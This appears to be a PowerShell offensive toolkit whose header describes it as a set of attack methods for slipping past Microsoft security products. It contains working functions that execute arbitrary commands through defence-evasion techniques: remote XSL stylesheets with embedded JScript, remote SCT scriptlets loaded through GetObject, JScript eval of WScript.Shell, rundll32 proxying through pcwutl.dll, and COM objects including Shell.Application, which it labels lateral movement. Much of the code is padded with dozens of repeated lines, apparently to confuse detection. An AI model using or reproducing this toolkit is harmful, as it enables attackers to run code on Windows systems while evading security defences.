<#
  .Author ( @harr0ey ) 
  .Lisence BSD3 
  .Required Dependencies: None
  .Optional Dependencies: None


  .Description
      Adaptive Confusions Powershell About attacking Places Secure From Some Products Microsofot With of some of the Executive methods of the system TTPs => APT LMMT
 
  .Broadly
    This makes you progressively advanced About Attacks Powershell
  

  .Example
    PS:> invoke-ConfusionJS -Command 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'


  .Example 
    PS:> invoke-Confusions-LLMTCOMCLSID -CLSID 
  

  .Example
    PS:> invoke-SCTExecution -SCT URL.SCT


  .Example 
    PS:> invoke-DLLLaunchApplication -CML calc.exe


  .Example
    PS:> invoke-lateralmovement -Command calc.exe
    
  .Example
    PS:> invoke-VBNET -CMLShell calc.exe


  .Example
    PS:> invoke-XMLTransform -XSL URL -XML URL


#> 

function invoke-XMLTransform {

 <#
   .Author ( bohop )
   .Licence BSD3
   
   Require Dependencies : None 
   Optional Dependencies : None 

   .Broadly  
    Powershell Function XML Execute XSL Using Transform XML To Send Reader XSL in Powershell Object XML
 
   .Note1 
   first Thing should Create File XSL this code Next 
   
   
   <?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
 
<msxsl:script language="JScript" implements-prefix="user">
   function xml(nodelist) {
var r = new ActiveXObject("WScript.Shell").Run("notepad.exe");
   return nodelist.nextNode().xml;
 
   }
</msxsl:script>
<xsl:template match="/">
   <xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
   
  .Note2 
   after Upload XSL To Gist in Github You can click to raw and add this URL XSL in XML This Function href-XML Code next

   <?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="" ?>
<customers>
<customer>
<name>Microsoft</name>
</customer>
</customers>

 #>

      [CmdletBinding()]    

   param (
   
     [Parameter(Mandatory=$true)]
    
           [String]$XSL,$XML
     )

     if ($like = $PSCmdlet) {
     $0xAddXSL = $XSL 
     $0x0AddXML = $XML
     $s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load("$XSL",$s,$r);$x.Transform("$XML",'z');del z;
     
     
     }

}

  function invoke-VBNET {
  <#
  
       .Author Matt Harr0ey
      
      .Licence BSD3
      
      Require  Dependencies : None
      Optional Dependencies : None
      
      .Broadly 
       Command line CML Execution using .NET VisualBasic Object 


      .Example invoke-VBNET -CMLShell calc.exe
  
  

  #>
  
    [CmdletBinding()]
     
     param (
     
     [Parameter(Mandatory=$true)]
      [Parameter(Position = 0, ParameterSetName = 'CMLShell')]
        [String]$CMLShell

     )
     
     if ($like = $CMLShell) {
      
       try {
     [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
      [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
       [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
        [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
         [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
          [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
           [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
            [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
             [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
              [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
               [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
                [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
                 [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
                  [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
                   [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
                    [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::Shell("$CMLShell","0");
     
     }Catch {
     
     throw '[!]Error: Add CML Execution'

     }

     }
  }

 function invoke-SCTExecution {

 
  [CmdletBinding()]

    param (
    
      [Parameter(Mandatory=$true)] 
       [Parameter(Position = 0, ParameterSetName = 'SCT')]
        [String]$SCT
    
    )
  if ($like = $SCT) {
   
    try {
   $SCTAddValue = "$SCT"
[Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
  [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
   [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
    [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
     [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
      [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
       [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
        [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
         [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
          [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic')
           [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject("script:$SCT").Exec(0)
 } Catch {
  throw ' [!] Error: URL SCT COM File ' 
 
 }
 
 
  }
 
 } 

      function invoke-DLLLaunchApplication {
      
<#
      
      .Author Matt Harr0ey
      
      .Licence BSD3
      
      Require  Dependencies : None
      Optional Dependencies : None
      
      .Broadly 
        CML Command Line Execution using DLL Via Launch Application Function

      .Example 
        PS:> invoke-DLLLaunchApplication     
#>


     [CmdletBinding()]
   param (
   
   [Parameter(Mandatory=$true)]
   
          [Parameter(Position = 0, ParameterSetName = 'CML')]
    
           [String]$CML
   
   )

   if ($like = $CML) {
    
      rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
       rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
        rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
         rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
          rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
           rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
            rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
             rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
              rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
               rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                 rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                  rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                   rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                    rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                     rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                      rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                       rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                        rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                         rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                          rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                           rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                            rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                             rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                              rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                               rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                                rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                                 rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                                  rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication HelloWorld
                    rundll32.exe C:\Windows\System32\pcwutl.dll,LaunchApplication $CML
  
   }
      
      } 

function invoke-ConfusionJS {


<#
  
  .Author Matt Harr0ey
  
  .Licence BSD3
  
  .Require Dependencies : None
  .Optional Dependencies : None

  .Broadly Execution JSCript Via .NET in Reflection Assembly To Excution ActiveX

  .Parameter Everything valid

 
  .Parameter Binding Execution valid
 
  .Parameter Powershell File valid


#>

    [CmdletBinding()]    

   param (
   
     [Parameter(Mandatory=$true)]
    
     [Parameter(Position = 0, ParameterSetName = 'Command')]
    
     [String]$Command
 
 )

   if ($null = $Command) {
        Write-Host ""
            [Reflection.Assembly]::LoadWithPartialName('Microsoft.JSCript')
    
                $attack = $Command
   
                      [Microsoft.JScript.Eval]::JScriptEvaluate($attack,[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())
      # Will Add Value in This Spaces
      # 'var invokeMethod = new ActiveXObject("WScript.Shell");invokeMethod.Run("notepad.exe")'

   }

}

function invoke-Confusions-LLMTCOMCLSID {

    [CmdletBinding()]    

   param (
   
     [Parameter(Mandatory=$true)]
    
       [Parameter(Position = 0, ParameterSetName = 'CLSIDCOM')]
    
           [String]$CLSIDCOM
     )

    if ($null = $PSCmdlet) {

   try {
   $COMEx = [Activator]::CreateInstance([type]::GetTypeFromCLSID("$CLSIDCOM")) 
 
  } Catch {
  
   throw 'Where CLSID Letters'
  }
  
 }

 }
 
 function invoke-lateralmovement {

 <#
 
  .Author Matt Harr0ey

  .Licence BSD3
  .Require Dependencies : None
  .Optional Dependencies : None


  .Broadly Lateral Movement Using ShellApp COM To Command Line Execution
 
  .Example invoke-lateralmovement -Command calc.exe

 #>
 
 [CmdletBinding()]
   param (
   
   [Parameter(Mandatory=$true)]
   
          [Parameter(Position = 0, ParameterSetName = 'Command')]
    
           [String]$Command
   
   )
   if ($null = $PSCommandPath) {

    $ExampleLLMT1 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
     $ExampleLLMT2 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
      $ExampleLLMT3 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
       $ExampleLLMT4 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
        $ExampleLLMT5 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
         $ExampleLLMT6 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
          $ExampleLLMT7 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
           $ExampleLLMT8 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
            $ExampleLLMT9 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
             $ExampleLLMT10 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
              $ExampleLLMT11 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
               $ExampleLLMT12 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                $ExampleLLMT13 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                 $ExampleLLMT14 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                  $ExampleLLMT15 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                   $ExampleLLMT16 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                    $ExampleLLMT17 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
                     $ExampleLLMT18 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT19 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT20 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT21 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT22 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT23 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT24 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT25 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT26=  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT27 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT28 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT29 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT30 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))
   $ExampleLLMT31 =  [Activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application"))

  $ExampleLLMT1.Application.Application.Application.Application.ShellExecute("pcalua")
   $ExampleLLMT2.Application.Application.Application.Application.ShellExecute("pcalua")
    $ExampleLLMT3.Application.Application.Application.Application.ShellExecute("pcalua")
     $ExampleLLMT4.Application.Application.Application.Application.ShellExecute("pcalua")
      $ExampleLLMT5.Application.Application.Application.Application.ShellExecute("pcalua")
       $ExampleLLMT6.Application.Application.Application.Application.ShellExecute("pcalua")
        $ExampleLLMT7.Application.Application.Application.Application.ShellExecute("pcalua")
         $ExampleLLMT8.Application.Application.Application.Application.ShellExecute("pcalua")
          $ExampleLLMT9.Application.Application.Application.Application.ShellExecute("pcalua")
           $ExampleLLMT10.Application.Application.Application.Application.ShellExecute("pcalua")
            $ExampleLLMT11.Application.Application.Application.Application.ShellExecute("pcalua")
             $ExampleLLMT12.Application.Application.Application.Application.ShellExecute("pcalua")
    $ExampleLLMT13.Application.Application.Application.Application.ShellExecute("pcalua")
    $ExampleLLMT14.Application.Application.Application.Application.ShellExecute("pcalua")
    $ExampleLLMT15.Application.Application.Application.Application.ShellExecute("pcalua")
$ExampleLLMT16.Application.Application.Application.Application.ShellExecute("pcalua")
 $ExampleLLMT17.Application.Application.Application.Application.ShellExecute("pcalua")
  $ExampleLLMT18.Application.Application.Application.Application.ShellExecute("pcalua")
   $ExampleLLMT19.Application.Application.Application.Application.ShellExecute("pcalua")
    $ExampleLLMT20.Application.Application.Application.Application.ShellExecute("pcalua")
     $ExampleLLMT21.Application.Application.Application.Application.ShellExecute("pcalua")
      $ExampleLLMT22.Application.Application.Application.Application.ShellExecute("pcalua")
       $ExampleLLMT23.Application.Application.Application.Application.ShellExecute("pcalua")
        $ExampleLLMT24.Application.Application.Application.Application.ShellExecute("pcalua")
         $ExampleLLMT25.Application.Application.Application.Application.ShellExecute("pcalua")
          $ExampleLLMT26.Application.Application.Application.Application.ShellExecute("pcalua")
           $ExampleLLMT27.Application.Application.Application.Application.ShellExecute("pcalua")
            $ExampleLLMT28.Application.Application.Application.Application.ShellExecute("pcalua")  
             $ExampleLLMT29.Application.Application.Application.Application.ShellExecute("pcalua")
              $ExampleLLMT30.Application.Application.Application.Application.ShellExecute("pcalua")
              try {
              $ExampleLLMT31.Application.Application.Application.Application.ShellExecute("$Command")
              } catch {
               theow "Add Your Command"
              
              }
              
              
 }
       

}

 
